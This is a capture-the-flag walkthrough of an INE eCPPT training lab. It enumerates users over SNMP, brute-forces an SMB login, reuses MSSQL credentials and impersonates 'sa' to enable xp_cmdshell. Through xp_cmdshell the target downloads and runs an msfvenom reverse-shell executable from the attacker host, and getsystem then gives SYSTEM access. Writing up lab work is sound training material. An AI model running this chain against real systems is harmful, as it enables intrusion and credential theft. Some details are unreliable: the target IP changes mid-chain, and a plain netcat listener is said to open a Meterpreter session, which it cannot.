**INE eCPPT Skill Check Lab — SNMP & Privilege Escalation — Flag 1 Walkthrough**

---

**Objective:** Obtain Flag 1 from the target system at `10.2.22.104`.

---

### Step 1 — SNMP Enumeration

* Tool: `snmpwalk`
* Community string: `blue`

**Command Executed:**

```
snmpwalk -v2c -c blue 10.2.22.104 1.3.6.1.4.1.77.1.2.25
```

**Result:**

* Enumerated valid users:

  * Guest
  * timothy
  * ssm-user
  * Administrator
  * DefaultAccount
  * WDAGUtilityAccount

---

### Step 2 — SMB Enumeration

* Tools: `smbclient`, `Metasploit smb_login` module

**SMB Null Session Test:**

```
smbclient -L //10.2.22.104 -N
```

Result: Access Denied

**SMB Login Brute Force with `timothy` account:**

```
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.2.22.104
set SMBUser timothy
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

**Valid Credentials Found:**

```
Username: timothy
Password: jordan
```

---

### Step 3 — SMB Share Enumeration with Valid Credentials

```
smbclient -L //10.2.22.104 -U timothy
```

**Shares Discovered:**

* ADMIN\$
* C\$
* IPC\$
* secrets

---

### Step 4 — Accessing `secrets` Share & Retrieving Flag 1

```
smbclient //10.2.22.104/secrets -U timothy
ls
get flag1.txt
```

**Flag 1 Retrieved:**

```
974a6ba2590c45e8b929fc86f676147e
```

---

### Step 5 — Additional Enumeration (Optional but Documented)

* Retrieved `mssql_creds.txt` containing credentials:

```
username: timmy
password: def_32121_@#
```

---

## **INE eCPPT Skill Check Lab — SNMP & Privilege Escalation — Flag 2 Walkthrough**

---

### Step 6 — Accessing MSSQL with Recovered Credentials

* Tool: `impacket-mssqlclient.py`

**Command Executed:**

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py 'timmy:def_32121_@#@10.2.18.250'
```

**Result:**

* Connected successfully as `guest` user
* Limited privileges — unable to run `sp_configure`, `OPENROWSET`, or `SELECT` on certain system tables

---

### Step 7 — Privilege Escalation via `EXECUTE AS LOGIN`

```sql
EXECUTE AS LOGIN = 'sa';
```

**Result:**

* Privileges escalated to `sa` user (db\_owner)

---

### Step 8 — Enabling and Using `xp_cmdshell`

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Command Execution via `xp_cmdshell`:**

```sql
EXEC xp_cmdshell 'type C:\flag2.txt';
```

**Flag 2 Retrieved:**

```
db2fd0fe52e54ab9b48d5dd2b313b030
```

---

## ✅ **Flag 2 Complete**

Successfully escalated from `guest` MSSQL user to `sa`, enabled command execution, and retrieved the flag.

---

## **INE eCPPT Skill Check Lab — SNMP & Privilege Escalation — Flag 3 Walkthrough**

---

### Step 9 — Spawn Reverse Shell with `xp_cmdshell`

* Created a reverse shell executable with `msfvenom`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.41.9 LPORT=4444 -f exe -o shell.exe
```

* Hosted with Python HTTP server:

```bash
python3 -m http.server 80
```

* Downloaded on target via `xp_cmdshell`:

```sql
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.41.9/shell.exe C:\Windows\Temp\shell.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';
```

* Listener on attack machine:

```bash
nc -lvnp 4444
```

**Result:** Meterpreter session opened.

---

### Step 10 — Privilege Escalation (getsystem)

From Meterpreter:

```bash
getsystem
```

**Result:**

```
...got system via technique 5 (Named Pipe Impersonation)
```

---

### Step 11 — Retrieve Flag 3

```bash
cd C:\Users\Administrator\Desktop
ls
type flag3.txt
```

**Flag 3 Retrieved:**

```
4afc6acaf56645268ab47551efa7864f
```

---

## ✅ **Flag 3 Complete**

SYSTEM access achieved and third flag retrieved successfully. The lab demonstrates a full chain: enumeration → SMB login → MSSQL abuse → reverse shell → SYSTEM → data exfiltration.

---

**Status:**

✅ Flag 1: Retrieved via SMB share access
✅ Flag 2: Retrieved via MSSQL `xp_cmdshell`
✅ Flag 3: Retrieved via Meterpreter shell after privilege escalation
